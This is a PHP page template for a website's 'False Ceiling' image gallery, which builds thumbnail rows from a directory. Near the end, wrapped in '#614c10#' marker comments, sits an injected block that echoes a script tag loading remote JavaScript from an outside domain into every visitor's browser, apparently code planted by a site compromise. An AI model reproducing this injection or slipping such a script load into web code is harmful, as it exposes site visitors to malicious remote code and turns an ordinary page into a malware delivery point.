<?php include "inc/header.php";?>			
<!-- Highlights -->
<section class="wrapper gallery">
	<div class="container ">
		<h3>False Ceiling</h3>
		<?php
			$dir1    = 'gallery/false_ceiling/thumb';
			$dir2    = 'gallery/false_ceiling';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>"><img src="<?php echo $dir1."/".$img ?>" alt="" /></a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
<?php
#614c10#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968093\"></script>";
echo $g;
}
#/614c10#
?>	</div>
</section>
<section class="wrapper strip_line">
</section>
<!-- Footer -->
<?php include "inc/footer.php";?>